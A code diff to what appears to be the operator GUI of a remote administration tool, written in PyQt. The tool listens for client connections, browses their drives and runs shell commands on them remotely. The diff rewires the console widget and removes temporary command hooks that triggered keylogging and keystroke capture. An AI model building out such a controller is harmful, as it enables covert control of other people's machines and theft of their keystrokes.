@@ -25,10 +25,11 @@ class MainDialog(QWidget, gui.Ui_Form):
         # init idle with lines
         self.llines = linesnum.LineTextWidget()
         self.LeditorLayout.addWidget(self.llines)
-        #self.rlines = linesnum.LineTextWidget()
-        #self.ReditorLayout.addWidget(self.rlines)
+        self.rlines = linesnum.LineTextWidget()
+        self.ReditorLayout.addWidget(self.rlines)
         self.console = console.Console()
-        self.ReditorLayout.addWidget(self.console)
+        self.shellLayout.addWidget(self.console)
+
 
         self.statusok('Initializing tray', self.lineno())
         # init tray
@@ -46,12 +47,13 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.port = 0
         self.timeout = 5
         self.gui = QApplication.processEvents
-        self.cursor = QTextCursor(self.consoleText.document())
+        #self.cursor = QTextCursor(self.consoleText.document())
         self.displayText(msg=credits.credit)
 
         self.statusok('Initializing signals', self.lineno())
         # Initializing signals
-        self.commandLine.returnPressed.connect(self.runCommand)
+        #self.commandLine.returnPressed.connect(self.runCommand)
+        #self.console.returnPressed.connect(self.runCommand)
         self.socketsList.itemDoubleClicked.connect(self.connectSocket)
         self.runserverButton.clicked.connect(self.scannerStart)
         self.stopserverButton.clicked.connect(self.scannerStop)
@@ -66,6 +68,7 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.connect(self, SIGNAL('triggered()'), self.closeEvent)
 
         self.connect(self.tabWidget, SIGNAL('currentChanged(int)'), self.tabDetector)
+        self.connect(self.console, SIGNAL("returnPressed"), self.runCommand)
 
         # Initializing combobox change Event
         self.connect(self.explorerDrivesDrop, SIGNAL('currentIndexChanged(int)'), self.driveChange)
@@ -74,7 +77,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
         self.statusok('Set placeholder text for command line', self.lineno())
         # Set placeholder text for command line
-        self.commandLine.setPlaceholderText('type command here...')
+        #self.commandLine.setPlaceholderText('type command here...')
 
         self.statusok('Initializing explorers custom menu', self.lineno())
         # Initializing explorer right click menu
@@ -87,7 +90,6 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.statusok('Initialized', self.lineno())
 
         self.tabWidget.setEnabled(False)
-
 
     # Detect tabs switch
     def tabDetector(self):
@@ -164,7 +166,7 @@ class MainDialog(QWidget, gui.Ui_Form):
         self.unlockedSocks = []
         self.counter = 0
         self.socketsList.clear()
-        self.commandLine.setText('')
+        #self.commandLine.setText('')
         self.acceptthreadState = True
         self.statusok('Initializing new thread for listen connections', self.lineno())
         # Initializing new thread for listen connections
@@ -629,30 +631,27 @@ class MainDialog(QWidget, gui.Ui_Form):
     # START: shell functions
     # display console text
     def displayText(self, msg='', header='', error=''):
-        self.consoleText.setHtml('''
-        <p align="center" style="color: #ffffff; background-color: #CC2E2E">%s</p>
-        <p align="center" style="color: #2ecc71; background-color: #194759">%s</p>
-        <p align="center" style="color: #ffffff;">%s</p>
-        ''' % (error, header, msg.replace('\n', '<br>').replace('\t', '   ')))
+        #self.consoleText.setHtml('''
+        #<p align="center" style="color: #ffffff; background-color: #CC2E2E">%s</p>
+        #<p align="center" style="color: #2ecc71; background-color: #194759">%s</p>
+        #<p align="center" style="color: #ffffff;">%s</p>
+        #''' % (error, header, msg.replace('\n', '<br>').replace('\t', '   ')))
+        print 'console'
 
     # run shell command
     def runCommand(self):
         if self.active:
             try:
 
-                # TEMP:
-                if self.commandLine.text() == 'StartLogging':
-                    self.Keylogging()
-                if self.commandLine.text() == 'GiveStokes':
-                    self.CaptureKeyStokes()
+                command = self.console.command
+                self.Send(command)
+                data = self.Receive().split('>')[-1]
+                while data.startswith('\n'):
+                    data = data[1:]
+                data = data.replace('\n', '<br>')
 
-                self.statusok('Send shell command', self.lineno())
-                # Send cmd command
-                self.Send(unicode(self.commandLine.text()))
-
-                self.statusok('Recieve answer for shell command', self.lineno())
-                # Recieve answer to shell command
-                self.data = self.Receive()
+                self.console.append('<font color=#3CFFFF>'+data+'</font>')
+                self.console.newPrompt()
 
             except socket.error:
 
@@ -662,15 +661,7 @@ class MainDialog(QWidget, gui.Ui_Form):
 
                 time.sleep(0.8)
                 self.active = False
-            if self.data != '':
 
-                self.statusok('Set status output', self.lineno())
-                # Set shell output
-                self.displayText(header=self.commandLine.text(), msg=self.data.split('[ENDOFMESSAGE]')[0])
-                self.commandLine.setText('')
-        else:
-            self.displayText(msg='run server and click to client for connect', error='Not connected')
-            self.commandLine.setText('')
     
     # END: shell functions
 
